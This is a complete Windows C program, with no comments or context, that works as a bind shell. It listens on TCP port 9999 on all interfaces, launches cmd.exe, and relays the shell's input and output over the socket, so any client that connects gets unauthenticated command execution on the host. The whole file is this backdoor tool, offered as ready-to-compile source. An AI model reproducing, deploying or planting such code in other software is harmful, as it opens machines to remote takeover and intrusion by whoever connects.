#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

HANDLE inp_pipe;
HANDLE out_pipe;
SOCKET client;
int flag = 1;

DWORD WINAPI sock_to_pipe(LPVOID p) {
    char buffer[4096];
    int r;
    while (flag) {
        r = recv(client, buffer, 4096, 0);
        if (r > 0) {
            DWORD w;
            WriteFile(inp_pipe, buffer, r, &w, NULL);
        }
        else {
            break;
        }
    }
    return 0;
}

DWORD WINAPI pipe_to_sock(LPVOID p) {
    char buf[4096];
    DWORD rd;

    while (flag == 1) {
        DWORD av;
        PeekNamedPipe(out_pipe, NULL, 0, NULL, &av, NULL);

        if (av > 0) {
            if (ReadFile(out_pipe, buf, 4096, &rd, NULL)) {
                send(client, buf, rd, 0);
            }
        }
        else {
            Sleep(100);
        }
    }
    return 0;
}

int main() {
    WSADATA wsa;
    int init = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (init != 0) {
        return 1;
    }

    HANDLE in_r, in_w, out_r, out_w;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&in_r, &in_w, &sa, 0)) {
        return 1;
    }
    SetHandleInformation(in_w, HANDLE_FLAG_INHERIT, 0);

    if (!CreatePipe(&out_r, &out_w, &sa, 0)) {
        return 1;
    }
    SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(si);
    si.hStdInput = in_r;
    si.hStdOutput = out_w;
    si.hStdError = out_w;
    si.dwFlags = STARTF_USESTDHANDLES;

    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        return 1;
    }

    CloseHandle(in_r);
    CloseHandle(out_w);

    inp_pipe = in_w;
    out_pipe = out_r;

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv == INVALID_SOCKET) {
        return 1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(9999);

    if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        return 1;
    }

    listen(srv, 1);

    printf("waiting for connection...\n");

    struct sockaddr_in cl_addr;
    int sz = sizeof(cl_addr);
    SOCKET c = accept(srv, (struct sockaddr*)&cl_addr, &sz);
    if (c == INVALID_SOCKET) {
        return 1;
    }

    printf("client connected\n");

    client = c;

    HANDLE t1 = CreateThread(NULL, 0, sock_to_pipe, NULL, 0, NULL);
    HANDLE t2 = CreateThread(NULL, 0, pipe_to_sock, NULL, 0, NULL);

    HANDLE handles[2];
    handles[0] = t1;
    handles[1] = t2;

    WaitForMultipleObjects(2, handles, TRUE, INFINITE);

    flag = 0;
    closesocket(c);
    closesocket(srv);

    CloseHandle(inp_pipe);
    CloseHandle(out_pipe);

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    WSACleanup();
    return 0;
}
